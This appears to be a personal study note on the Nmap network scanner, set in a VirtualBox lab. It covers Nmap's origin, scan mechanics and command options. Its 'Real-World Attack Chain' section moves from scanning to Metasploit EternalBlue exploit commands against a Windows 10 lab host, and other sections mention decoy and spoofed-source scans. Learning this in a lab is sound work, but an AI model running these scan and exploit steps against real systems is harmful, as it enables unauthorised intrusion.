# Day 1: Nmap — The Network Mapper

> **Category:** Information Gathering
> **Difficulty:** ⭐⭐ Intermediate
> **Time Spent:** 4 hours

---

## 📖 1. Origin Story

**Who Made It:** Gordon Lyon (Fyodor) in 1997
**Why It Exists:** Before Nmap, network scanning required manual packet crafting or expensive commercial tools.
**What Came Before:** `ping`, custom C programs, ISS Internet Scanner.
**Why Nmap Won:** Open source, fast, extensible (NSE), cross-platform.

---

## 📖 2. Etymology

**Nmap** = **N**etwork **Map**per
- **Network** — The interconnected system of hosts
- **Map** — To chart, discover, and document

---

## 📖 3. Architecture

| Component | Description |
|-----------|-------------|
| Language | C, C++, Lua (NSE) |
| Dependencies | libpcap, OpenSSL, Lua |
| Platforms | Linux, Windows, macOS, BSD |
| License | GPLv2 |
| Current Version | 7.99SVN |

---

## 📖 4. Mechanism

### Step 1: Host Discovery

1. Nmap sends ARP request (local) or ICMP echo (remote)
2. If host responds, it's marked as "up"
3. If no response, Nmap may send TCP SYN to port 80 or 443

### Step 2: Port Scanning

1. Nmap sends TCP SYN packet to each port
2. SYN-ACK → port is OPEN
3. RST → port is CLOSED
4. No response → port is FILTERED

### Step 3: Service Detection

1. Nmap connects to open port
2. Sends probes (HTTP GET, SSH banner, etc.)
3. Compares response to signature database
4. Identifies service and version

---

## 📖 5. System-Level Trace
User runs: nmap -sS 192.168.56.106
↓
Shell parses arguments
↓
Nmap binary loaded
↓
Nmap opens raw socket (CAP_NET_RAW capability)
↓
Nmap builds TCP SYN packet
↓
Kernel IP layer adds IP header
↓
Kernel ARP resolves MAC address
↓
Network driver sends Ethernet frame
↓
VirtualBox virtual NIC
↓
Host machine network stack
↓
Windows 10 virtual NIC
↓
Windows kernel receives frame
↓
TCP layer processes SYN
↓
If port open: sends SYN-ACK
↓
Reply travels back through all layers
↓
Nmap receives SYN-ACK
↓
Nmap sends RST (doesn't complete handshake)
↓
Nmap displays: "445/tcp open"



---

## 📖 6. Command Dissection

### Basic Scan
```bash
nmap 192.168.56.106
SYN Scan (Stealth)
bash
sudo nmap -sS 192.168.56.106
Service Version Detection
bash
sudo nmap -sV 192.168.56.106
OS Detection
bash
sudo nmap -O 192.168.56.106
Full Port Scan
bash
sudo nmap -sS -p- -T4 -n 192.168.56.106
Vulnerability Scan
bash
sudo nmap --script vuln -n 192.168.56.106
📖 7. Why This? Why Not That?
Alternative	Why Nmap Chose This	Trade-off
TCP Connect Scan	SYN scan is stealthier	Requires root
UDP Scan	TCP is more common	UDP is slower
ICMP Ping	ARP is more reliable on LAN	Only works on local network
Masscan	Nmap is more feature-rich	Masscan is faster
📖 8. Real-World Attack Chain
Scenario: Windows 10 target (192.168.56.106)

Step 1: Discover Host
bash
sudo nmap -sn 192.168.56.0/24
Step 2: Scan Ports
bash
sudo nmap -sS -sV -p- -T4 -n 192.168.56.106
Step 3: Identify Services
Port 135: RPC

Port 139: NetBIOS

Port 445: SMB

Step 4: Check for Vulnerabilities
bash
sudo nmap -p 445 --script smb-vuln-ms17-010 -n 192.168.56.106
Step 5: Exploit
bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.106
set LHOST 192.168.56.100
run
📖 9. Failure Modes
Failure	Cause	Fix
massdns.cc: Assertion failed	DNS resolver bug	Add -n flag
Couldn't open raw socket	Not root	Use sudo
Host seems down	Firewall blocking	Use -Pn
Slow scan	High latency	Use -T4
No ports open	Firewall	Disable firewall

---

📖 10. Security Lens


ASSET: Network services
TRUST BOUNDARY: Firewall, IDS/IPS
ASSUMPTION: Open ports mean reachable services
ATTACK SURFACE: Every open port
VULNERABILITY: Unpatched services, misconfigurations
EXPLOIT CONDITION: Known CVE + reachable port
IMPACT: Depends on service (RCE, data theft)
DETECTION: IDS signatures, logs
MITIGATION: Firewall, patching, segmentation
RESIDUAL RISK: Zero-day exploits
📖 11. Edge Cases
Edge Case	What Happens
Port 0	Invalid, usually ignored
Port 65536	Invalid, out of range
Fragmented packets	Nmap can fragment with -f
Decoy scan	-D sends from fake IPs
Spoofed source	-S spoofs source IP
Idle scan	-sI uses zombie host
📖 12. Source Code Forensics
Nmap's Source Code Structure:

---

nmap/
├── scan_engine.cc       # Port scanning logic
├── osscan2.cc           # OS detection
├── service_scan.cc      # Service detection
├── target.cc            # Target management
├── nse_main.cc          # NSE engine
├── nse_script.cc        # NSE script execution
└── output.cc            # Output formatting
Key Function: ultra_scan()

Located in scan_engine.cc

Handles the core scanning loop

Uses select() or poll() for async I/O

---

📖 13. Experimental Verification
Test 1: Verify Nmap Uses Raw Sockets
bash
sudo strace -e trace=socket nmap -sS 192.168.56.106
Test 2: Capture Nmap Traffic
bash
sudo tcpdump -i eth0 host 192.168.56.106 -w nmap.pcap
# In another terminal:
sudo nmap -sS 192.168.56.106
# Analyze in Wireshark
Test 3: Compare SYN vs Connect Scan
bash
# SYN scan (root)
sudo nmap -sS 192.168.56.106

---

# Connect scan (non-root)
nmap -sT 192.168.56.106
